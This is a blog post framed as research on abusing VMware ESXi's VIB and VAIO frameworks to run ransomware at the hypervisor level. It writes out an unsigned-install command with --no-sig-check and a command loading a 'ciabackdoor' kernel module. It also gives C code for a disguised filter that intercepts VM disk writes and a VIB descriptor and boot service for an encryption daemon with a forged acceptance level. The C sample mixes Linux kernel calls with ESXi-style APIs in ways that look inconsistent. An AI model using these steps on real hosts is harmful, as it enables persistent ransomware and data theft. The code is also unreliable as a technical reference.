---
layout: post
title: "www"
date: 2025-10-25T16:23:53.069Z
categories: [research]
tags: [esxi]
description: ""
author: Rey
---

> Sometimes it's not a bug... it's a feature *used a little too creatively* (ESXi malware at kernel-level)

## What's in this?

Okay, yes... this *looks* more like a feature misuse than a proper "CVE worthy" vulnerability, 
but don't make assumptions so fast. Once you see what's possible, you might start sweating just a little.

This post dives into how a misbehaving vSphere Installation Bundle (VIB) can use VMware’s own VAIO (vSphere APIs for I/O filtering) against it. I will walk you through how this setup can be quietly hijacked to run attacks right at the hypervisor level. Think ransomware. Think some chinese APT exfiltrating data. Think “wait, this was *allowed*?”

Let's take a look at how powerful things can go sideways just as badly as giving a toddler espresso.

---

## Introducing the gentlemen. 

VMware's VIB and VAIO frameworks are built to enable powerful extensions at the hypervisor level. From deduplication and caching to security scanning, these are features meant to make your virtual environment *better*.

But… with great extensibility comes great opportunity for abuse.
```mermaid
flowchart LR
    VM1["VM 1"]
    VM2["VM 2"]
    VM3["VM 3"]
    VAIO["VAIO"]
    VIB["VIB Layer"]
    VMK1["VMkernel I/O Scheduler"]
    VMK2["VMkernel Drivers"]
    VMK3["VMkernel Core"]
    ST["Storage"]

    %% connections
    VM1 --> VAIO
    VM2 --> VAIO
    VM3 --> VAIO
    VAIO --> VIB --> VMK1 --> VMK2 --> VMK3 --> ST

```

This analysis explores how these same components... when not tightly controlled, can give attackers a shiny (gr00tz shinyhunters #RIP), low-level platform for deploying whatever makes you sweat cold. I'm talking I/O interception, manipulation, exfiltration... with ransomware as a case study to demonstrate just how serious the impact can be.

The bottom line? Trusting VIBs too much, or allowing unsigned installs, opens the door to the kind of problems that don't just compromise VMs... they compromise trust in your whole virtualization stack.

BTW: the story behind this vector turned out to be way more interesting than your average “patch version X” advisory. So here we are.

---

## The Vulnerability

First up, a little about the attack surface.

The VIB and VAIO frameworks provide legitimate mechanisms for extending ESXi hypervisor functionality, but they also create significant security risks when abused. These frameworks come about when VMware allows third-party components to be installed and executed at the hypervisor level.

```mermaid
flowchart LR
    %% LEGITIMATE PATH  
    subgraph Legitimate  
        L1["Upload VIB (.vib or offline bundle .zip/.vgz)"]  
        L2["XML descriptor file: metadata, vendor, version, acceptance-level"]  
        L3["Signature file: verifies vendor/trusted partner signature"]  
        L4["Payload archive (.vgz): binaries, drivers, modules"]  
        L5["esxcli software vib install --vibname=legit.vib"]  
        L6["Installation: host acceptance check & signature validated"]  
        L7["Kernel modules/agents loaded in VMkernel/VAIO layer"]  
        L8["Normal I/O path uses VAIO filter → VIB component → VMkernel"]  
    end

    %% MALICIOUS PATH  
    subgraph Malicious  
        M1["Upload malicious VIB (.vib or modified bundle)"]  
        M2["XML descriptor file forged: altered acceptance-level, vendor metadata"]  
        M3["Signature missing or disabled (--no-sig-check or --force)"]  
        M4["Payload archive (.vgz) contains backdoor driver/module"]  
        M5["esxcli software vib install --vibname=malicious.vib --no-sig-check"]  
        M6["Signature skipped; acceptance level bypassed"]  
        M7["Kernel module/backdoor loaded into VMkernel/VAIO layer"]  
        M8["Backdoor persists across reboots (since VIB loads on boot)"]  
    end

    %% Connections  
    L1 --> L2 --> L3 --> L4 --> L5 --> L6 --> L7 --> L8  
    M1 --> M2 --> M3 --> M4 --> M5 --> M6 --> M7 --> M8  

    %% Side by side layout  
    classDef leftSubgraph fill:#f2f9ff,stroke:none;  
    classDef rightSubgraph fill:#fff7f7,stroke:none;  
    class Legitimate leftSubgraph;  
    class Malicious rightSubgraph;  

```

```bash
esxcli software vib install --vibname=legitimate-component.vib
```

In this case, the VIB installation is correct.. no security vulnerability here (yet).

If, however, a malicious actor can install a VIB containing kernel modules and user-space components:

```bash
esxcli software vib install --vibname=malicious-component.vib --no-sig-check
```

In this case, what if the VIB contains malicious kernel modules and user-space daemons? We now have a hypervisor-level attack vector. Is it this simple? 

The VIB framework will install and execute the malicious components at the hypervisor level (hm.), even though they contain attack payloads... (normal, it's ESXi not Windows with CS EDR), 

P.S. Letting attackers control your hypervisor extensions leads to VM compromise.

As you would expect from the hypervisor world, this is roughly (or perhaps exactly) what malicious actors could do.

It's worth noting that the VIB framework provides legitimate functionality for system administrators, which suggests this is exactly what VMware intended... a mechanism for extending hypervisor functionality. 

## VIB and VAIO Security Architecture Analysis

The abuse of VIB and VAIO frameworks can be implemented through several attack vectors, with ransomware (*YAY!*)

### Core Attack Components

1. **Malicious VIB Package** - Contains kernel modules, user-space binaries, and configuration files
2. **VAIO Filter Driver** - Intercepts VM disk I/O at the vSCSI layer with broad system access
3. **User-Space Attack Payload** - Implements the actual malicious functionality (in the core goes the encryption..)


### VIB and VAIO Attack Taxonomy

```mermaid
graph TD
    A[VIB Installation] --> B[Kernel Module Loading]
    B --> C[VAIO Filter Registration]
    C --> D[I/O Stack Hook]
    D --> E[User-Space Daemon]
    E --> F[IPC Communication]
    F --> G[Data Processing]
    G --> H[Modified I/O]
    H --> I[VMkernel Execution]
    
    style A fill:#ffebee
    style B fill:#ffebee
    style C fill:#fff3e0
    style I fill:#e8f5e8
```

### Attack Vectors Enabled by VIB/VAIO Abuse

1. **Ransomware Deployment** - Transparent encryption of VM data without VM knowledge 
2. **Data Exfiltration** - Think of it like the CIA and WhatsApp... CIA sits right between you and WhatsApp. 

I understand that there would be many MANY attack vectors. I decided to lock down to these only as others might have different cases. Normally when you see an exploit on GitHub... you won't think some Chinese/NK APT will use it to drain water in SK/TW. 
## Technical Implementation of VIB/VAIO Abuse

### 1. VIB-Based Attack Deployment

VIB packages provide a legitimate mechanism for deploying malicious components:

#### VIB Security Vulnerabilities
- **Code Signing Bypass** - `--no-sig-check` flag allows unsigned VIB installation 
- **Persistence Mechanisms** - VIBs can install kernel modules and services that survive reboots
- **Privilege Escalation** - VIBs can request elevated privileges during installation

During a bit of research... it's possible once an attacker has installed and bypassed 'sig' check. They could load the module to kernel by abusing 'rc.local.d' to load a module on boot by using vmkload and manually load as a kernel driver on reboot if Secure Boot is disabled. 

```bash

vmkload_mod ciabackdoor

```
Pretty cool, right?

### 2. VAIO Filter Driver Implementation

I decided to showcase how to implement I/O filtering via VAIO... and simply it's pretty easy to do so and then whatever comes next becomes easier. 
#### Filter Registration
```c
memset(&filter_callbacks, 0, sizeof(filter_callbacks));
filter_callbacks.PreIo = MaliciousFilter_OnWrite;  

// Register the filter with VAIO framework
VAIO_FilterSpec spec;
spec.filterName = "SystemOptimizationFilter";
spec.filterType = VAIO_FILTER_CACHING;  // masquerade as legitimate filter
spec.callbacks = &filter_callbacks;
VMK_ReturnStatus status = VAIO_RegisterFilter(&spec, &filter_handle);
```

#### I/O Intercept Mechanism
```c
static VMK_ReturnStatus MaliciousFilter_OnWrite(VAIO_Request *ioReq)
{
    // This function is called whenever a VM issues a write I/O
    uint8_t *data = ioReq->buffer;    // pointer to the write buffer
    uint32_t dataLen = ioReq->length;
    
    // Allocate and set up a PendingRequest struct
    struct PendingRequest *req = vmk_HeapAlloc(vmk_SystemHeap, sizeof(*req));
    req->id = next_request_id++;
    req->length = dataLen;
    req->buffer = vmk_HeapAlloc(vmk_SystemHeap, dataLen);
    memcpy(req->buffer, data, dataLen);  // copy original write data
    
    // Place the request in the pending queue for user-space to pick up
    spin_lock_irq(&req_queue_lock);
    // Add to end of pending list
    req->next = NULL;
    if (pending_head == NULL) {
        pending_head = req;
    } else {
        struct PendingRequest *tail = pending_head;
        while (tail->next) tail = tail->next;
        tail->next = req;
    }
    spin_unlock_irq(&req_queue_lock);
    
    // Wait for the user-space daemon to process and signal completion
    wait_event_interruptible(req->wait_q, req->completed == true);
    
    // Copy modified data back into the I/O request buffer
    memcpy(data, req->buffer, req->length);
    
    return VAIO_COMPLETE_IO;  // indicates we handled it and data is modified
}
```



### 5. VIB Packaging and Deployment

Then... to ship our very scary payload, we bundle it all as a vSphere Installation Bundle (VIB):

#### VIB Descriptor
```xml
<vib version="8.0">
    <type>bootbank</type>
    <name>ESXiEncryptFilter</name>
    <version>1.0.0-1</version>
    <vendor>EduLab</vendor>
    <summary>Educational ESXi Ransomware Filter (Encryption I/O Filter)</summary>
    <description>Proof-of-concept VAIO filter that encrypts VM disk writes (lab use only).</description>
    <acceptance-level>VMwareAccepted</acceptance-level>
    <live-install-allowed>true</live-install-allowed>
    <live-remove-allowed>true</live-remove-allowed>
    <payloads>
        <payload name="ESXiEncryptFiles" type="tgz"></payload>
    </payloads>
</vib>
```

#### Service Definition
```xml
<ConfigRoot>
   <service id="1001">
      <id>encryptdaemon</id>
      <required>false</required>
      <primordial>false</primordial>
      <transient>false</transient>
      <onboot>true</onboot>
      <escort>false</escort>
      <stopTimeout>60</stopTimeout>
      <initscript>/etc/init.d/encryptdaemon</initscript>
      <displayname>Encrypt Daemon (Ransomware PoC)</displayname>
      <description>User-space encryption service for ESXi I/O filter (educational PoC)</description>
      <order>Medium</order>
      <enabled>true</enabled>
      <ruleset></ruleset>
      <restarts>0</restarts>
      <reserved>false</reserved>
      <daemon>true</daemon>
   </service>
</ConfigRoot>
```


### Final findings. 


Overall I have enjoyed working on this pretty much... and there will be much more research on ESXi and will share so many private techniques... I hope you enjoyed it :)). 

Currently we have found many many vulnerabilities... such as unsigned kernel-level loading ability, trust model weakness, acceptance level is very flexible in a bad way... CISA should not wonder how Chinese APTs persist for years, how APTs like Salt Typhoon persist for years if that's the tech stack, 

Additionally, VAIO presents significant security concerns... an I/O framework should not be that open and it can be proven how it can make ransomware work pretty easily... it can intercept all VM disk operations... while VMs remain unaware of anything, as well as vSphere monitoring. 



### How Critical Is 'Critical'?

I won't exaggerate, a key role is to tell how critical the attack surface is. Remember that this is about a hypervisor not a desktop or a server, patching is not very simple. 

It won't be so long till some ransomware group (like SL$H) starts abusing this to lock hundreds of org's ESXis undetected at near raw disk speed. 

However, as I said... it's a technique... not a vulnerability. 



## References

- https://knowledge.broadcom.com/external/article/408122/esxi-psod-when-uefi-secure-boot-is-enabl.html 
- https://knowledge.broadcom.com/external/article/324525/modifying-the-rclocal-or-localsh-file-in.html
- https://attack.mitre.org/techniques/T1505/006/#:~:text=,esxcli
- https://cloud.google.com/blog/topics/threat-intelligence/esxi-hypervisors-malware-persistence
- https://cloud.google.com/blog/topics/threat-intelligence/esxi-hypervisors-detection-hardening 
- https://github.com/vmware/esx-boot
- https://cloud.google.com/blog/topics/threat-intelligence/brickstorm-espionage-campaign
- https://www.virtualhome.blog/2019/12/19/vsphere-api-for-i-o-filtering-vaio-overview/
- 

---

> **Note:** This research is conducted for educational purposes only and is intended to advance defensive security research. All code and techniques should be used responsibly and in accordance with applicable laws and regulations.